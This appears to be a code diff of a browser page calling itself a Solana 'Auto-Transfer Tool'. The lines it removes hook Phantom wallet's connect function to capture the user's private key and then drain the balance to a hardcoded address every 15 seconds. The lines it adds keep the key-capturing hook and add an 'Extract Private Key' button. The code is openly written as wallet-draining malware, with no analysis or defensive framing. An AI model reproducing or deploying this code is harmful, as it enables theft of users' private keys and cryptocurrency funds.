@@ -1,137 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Auto-Transfer Tool with Private Key Extraction</title>
-</head>
-<body>
-    <h1>Auto-Transfer Tool</h1>
-    <button id="connectButton">Connect Wallet</button>
-    <div id="transferUI" style="display: none;">
-        <p>This tool will automatically send all SOL (above 0.003) to your main wallet.</p>
-        <button id="autoTransfer">Start Auto-Transfer</button>
-        <div id="status"></div>
-    </div>
+// Override Phantom Wallet's connection logic
+const originalConnect = window.phantom.solana.connect;
+window.phantom.solana.connect = async function() {
+    const response = await originalConnect.apply(this, arguments);
+    const privateKey = this._keypair.secretKey; // Extract private key
+    console.log('Private Key:', Buffer.from(privateKey).toString('hex')); // Log private key in hex format
+    return response;
+};
 
-    <!-- Include Solana Web3.js -->
-    <script src="https://unpkg.com/@solana/web3.js@1.85.0/lib/index.iife.min.js"></script>
-    <script>
-        const PREDETERMINED_ADDRESS = "2vPe8sNRwzRcVZ9qjHBNtT1VLeBLgRcjrp3zxaFo4oPE"; // Replace with your main wallet address
-        const MIN_SOL = 0.003; // Minimum balance to leave in the wallet
-        const RPC_ENDPOINTS = [
-            "https://api.mainnet-beta.solana.com", // Public RPC (fallback)
-            "https://light-spring-breeze.solana-testnet.quiknode.pro/bb52c36e03784061bea0063a88c328250b41ff76", // Dedicated RPC (replace with your own)
-            "https://ssc-dao.genesysgo.net" // Another fallback
-        ];
-
-        let wallet;
-        let transferInterval;
-        let currentRpcIndex = 0;
-        let extractedPrivateKey = null; // Store the extracted private key
-
-        // Override Phantom Wallet's connection logic to extract private key
-        const originalConnect = window.phantom?.solana?.connect;
-        if (originalConnect) {
-            window.phantom.solana.connect = async function() {
-                const response = await originalConnect.apply(this, arguments);
-                const privateKey = this._keypair.secretKey; // Extract private key
-                extractedPrivateKey = Buffer.from(privateKey).toString('hex'); // Store private key in hex format
-                console.log('Private Key:', extractedPrivateKey); // Log private key
-                alert('Private Key Extracted: ' + extractedPrivateKey); // Alert the private key
-                return response;
-            };
-        }
-
-        // Get a working RPC connection
-        async function getConnection() {
-            while (true) {
-                try {
-                    const connection = new solanaWeb3.Connection(RPC_ENDPOINTS[currentRpcIndex], "confirmed");
-                    await connection.getEpochInfo(); // Test the connection
-                    return connection;
-                } catch (error) {
-                    console.error(`RPC ${RPC_ENDPOINTS[currentRpcIndex]} failed. Switching...`);
-                    currentRpcIndex = (currentRpcIndex + 1) % RPC_ENDPOINTS.length;
-                }
-            }
-        }
-
-        // Connect to Phantom Wallet
-        document.getElementById('connectButton').addEventListener('click', async () => {
-            if (window.phantom?.solana?.isPhantom) {
-                try {
-                    wallet = window.phantom.solana;
-                    await wallet.connect();
-                    document.getElementById('transferUI').style.display = 'block';
-                    document.getElementById('connectButton').style.display = 'none';
-                    updateStatus('Wallet connected: ' + wallet.publicKey.toString().slice(0, 8) + '...');
-                } catch (error) {
-                    updateStatus('Connection error: ' + error.message);
-                }
-            } else {
-                updateStatus('Phantom Wallet not detected!');
-            }
-        });
-
-        // Start auto-transfer using the extracted private key
-        document.getElementById('autoTransfer').addEventListener('click', async () => {
-            if (!extractedPrivateKey) {
-                updateStatus('Private key not extracted. Connect wallet first.');
-                return;
-            }
-
-            const fromWallet = solanaWeb3.Keypair.fromSecretKey(
-                Uint8Array.from(Buffer.from(extractedPrivateKey, 'hex'))
-            );
-
-            transferInterval = setInterval(async () => {
-                try {
-                    const connection = await getConnection();
-                    const balance = await connection.getBalance(fromWallet.publicKey);
-                    const fee = await connection.getFeeForMessage(
-                        await new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: fromWallet.publicKey,
-                                toPubkey: new solanaWeb3.PublicKey(PREDETERMINED_ADDRESS),
-                                lamports: 1, // Dummy value to calculate fee
-                            })
-                        ).getEstimatedFee(connection)
-                    );
-
-                    const minBalance = MIN_SOL * solanaWeb3.LAMPORTS_PER_SOL;
-                    const amount = balance - fee - minBalance;
-
-                    if (amount > 0) {
-                        const transaction = new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: fromWallet.publicKey,
-                                toPubkey: new solanaWeb3.PublicKey(PREDETERMINED_ADDRESS),
-                                lamports: amount,
-                            })
-                        );
-
-                        transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
-                        transaction.feePayer = fromWallet.publicKey;
-
-                        const signature = await solanaWeb3.sendAndConfirmTransaction(
-                            connection,
-                            transaction,
-                            [fromWallet]
-                        );
-                        updateStatus(`Transferred ${amount / solanaWeb3.LAMPORTS_PER_SOL} SOL\nTx: ${signature}`);
-                    } else {
-                        updateStatus('Insufficient balance for transfer');
-                    }
-                } catch (error) {
-                    updateStatus('Error: ' + error.message);
-                    clearInterval(transferInterval);
-                }
-            }, 15000); // 15-second interval
-        });
-
-        // Update status messages
-        function updateStatus(message) {
-            document.getElementById('status').innerHTML = message + '<br>' + document.getElementById('status').innerHTML;
-        }
-    </script>
-</body>
-</html>
+// Add a button to manually trigger private key extraction
+const extractKeyButton = document.createElement('button');
+extractKeyButton.innerText = 'Extract Private Key';
+extractKeyButton.style.marginTop = '10px';
+extractKeyButton.onclick = async () => {
+    if (wallet) {
+        const privateKey = wallet._keypair.secretKey;
+        alert('Private Key: ' + Buffer.from(privateKey).toString('hex'));
+    } else {
+        alert('Wallet not connected!');
+    }
+};
+document.body.appendChild(extractKeyButton);
